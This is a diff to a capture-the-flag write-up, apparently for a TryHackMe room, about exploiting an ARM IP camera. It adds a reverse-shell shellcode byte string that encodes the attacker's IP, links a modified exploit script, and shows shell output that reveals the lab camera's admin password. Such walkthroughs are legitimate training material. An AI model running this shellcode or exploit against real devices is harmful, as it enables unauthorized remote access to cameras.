@@ -149,8 +149,78 @@ Now we can simply copy this set of instructions to the assembler and convert it 
 
 You can follow [THIS LINK](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r1%2C+%230xf0++%0D%0Alsl+r1%2C+%238++++%0D%0Aadd+r1%2C+%230x34+++%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02++++%0D%0Apush+%7Br1%7D++&arch=arm&as_format=inline#assembly) and simply change the `#0xf0` and `#0x34` values to correspond to your IP address - but remember to avoid using any *bad characters*!
 
+So we can now update the python script with the new byte string we generated:
+```
+"\xf0\x10\xa0\xe3\x01\x14\xa0\xe1\x34\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x04\x10\x2d\xe5"
+```
+
+[You may have a look at the update python code here](code/Snowy_ARMageddon/modified_exploit.py).
+
+Just by running the `modified_exploit.py` we get a reverse shell connection to the IP Camera :)
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/c407311b-5deb-4533-95e3-7cc1a944a6ea)
+
+```
+$ ls -la
+drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 .
+drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 ..
+drwxr-xr-x    2 root     root          4096 Jan 16  2024 .emux
+drwxr-xr-x    2 1000     1000          4096 Dec 17  2023 bin
+drwxr-xr-x    2 1000     1000          4096 Jan 16  2024 dev
+drwxr-xr-x   15 1000     1000          4096 Dec  4  2023 etc
+drwxr-xr-x    4 1000     1000          4096 Feb  6  2017 home
+drwxr-xr-x    3 1000     1000          4096 Feb  6  2017 lib
+dr-xr-xr-x   77 root     root             0 Dec 31 19:00 proc
+drwxr-xr-x    2 1000     1000          4096 Dec 17  2023 root
+drwxr-xr-x    2 1000     1000          4096 Feb  6  2017 sbin
+drwxr-xr-x   12 root     root             0 Dec 31 19:00 sys
+lrwxrwxrwx    1 1000     1000             8 Feb  6  2017 tmp -> /var/tmp
+drwxr-xr-x    4 1000     1000          4096 Feb  6  2017 usr
+drwxr-xr-x   13 1000     1000          4096 Jan 16  2024 var
+```
+
+```
+$ cd .emux
+$ ls -la
+drwxr-xr-x    2 root     root          4096 Jan 16  2024 .
+drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 ..
+-rwxr-xr-x    1 root     root           169 Jan 16  2024 .nfs00000000000fa3a300000001
+```
+
+```
+$ cat .nfs00000000000fa3a300000001
+#!/bin/sh
+rm -f /dev/abs628
+touch /dev/abs628
+/etc/init.d/rc.sysinit
+sed -i 's/password=admin/password=Y3tiStarCur!ous&/' /var/etc/umconfig.txt
+/etc/init.d/rc 3
+/bin/sh
+```
+
+```
+$ cat /var/etc/umconfig.txt
+TABLE=users
+
+ROW=0
+name=admin
+password=Y3tiStarCur!ouspassword=admin
+group=administrators
+prot=0
+disable=0
+
+TABLE=groups
+
+ROW=0
+...
+
+
+```
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/65a346a5-30b7-4333-ade8-422587966199)
+```
+
+...
+```
 
 
 
